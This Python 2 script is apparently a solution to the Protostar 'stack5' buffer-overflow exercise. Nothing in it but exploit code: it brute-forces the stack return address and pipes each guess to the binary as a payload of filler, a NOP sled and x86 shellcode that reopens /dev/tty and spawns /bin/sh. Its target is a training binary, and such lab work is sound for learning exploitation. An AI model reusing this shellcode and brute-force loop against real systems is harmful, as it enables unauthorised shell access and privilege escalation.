'''
 Brute force the return address (if we can't get it from the core)
'''

import subprocess

binary = "/opt/protostar/bin/stack5"

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89" + \
            "\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50" + \
            "\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
filler = "A"
NOP = "\x90"
# one good address: addr = "\xd0\xf7\xff\xbf"

for i in range (1, 256):
    for j in range (1, 256):
        addr = "%c%c\xff\xbf" % (chr(i), chr (j))
        print "Trying addr: ", "".join('\\x%02x' % ord(c) for c in addr)

        payload = filler * 76 + addr + NOP * 10 + shellcode

        p = subprocess.Popen([binary], stdin=subprocess.PIPE, \
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # send payload to child process' stdin
        print p.communicate(payload)

        # block
        ret=p.wait()
